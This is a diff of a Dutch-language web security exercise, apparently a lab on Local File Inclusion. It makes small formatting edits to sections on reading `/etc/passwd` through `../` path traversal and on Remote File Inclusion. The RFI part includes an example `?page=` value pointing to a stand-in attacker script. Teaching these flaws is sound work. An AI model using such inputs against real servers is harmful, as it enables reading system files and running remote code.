@@ -78,7 +78,7 @@ Je zult zien dat de opmaak van de pagina vol staat met systeemtekst, beginnend m
 
 ## 5. ✓ Wat moest je zien?
 
-:::tip Controle
+:::tip[Controle]
 - De pagina toont de inhoud van `/etc/passwd` — een lijst van Linux-gebruikers op de server.
 - De tekst begint met iets als `root:x:0:0:root:/root:/bin/bash`.
 - Er is geen foutmelding — de include is geslaagd.
@@ -88,4 +88,4 @@ Zie je een foutmelding in plaats van gebruikers? Voeg meer `../` toe — zolang 
 
 ## 6. Er gaat iets mis...
 
-Wat als je in plaats van een lokaal bestand een URL van een andere website probeert in te vullen? Bijvoorbeeld: `?page=http://hacker.nl/kwaadaardig_script.php`. Als dit lukt, noemen we het **Remote File Inclusion (RFI)** — de server downloadt jouw script en voert het uit als eigen code! Als het niet lukt, heeft de beheerder `allow_url_include = Off` ingesteld in `php.ini`. Dat is tegenwoordig de standaard. LFI werkt echter nagenoeg altijd als er geen input-validatie is.
+Wat als je in plaats van een lokaal bestand een URL van een andere website probeert in te vullen? Bijvoorbeeld: `?page=http://hacker.nl/kwaadaardig_script.php`. Als dit lukt, noemen we het **Remote File Inclusion (RFI)** — de server downloadt jouw script en voert het uit als eigen code. Als het niet lukt, heeft de beheerder `allow_url_include = Off` ingesteld in `php.ini`. Dat is tegenwoordig de standaard. LFI werkt echter nagenoeg altijd als er geen input-validatie is.
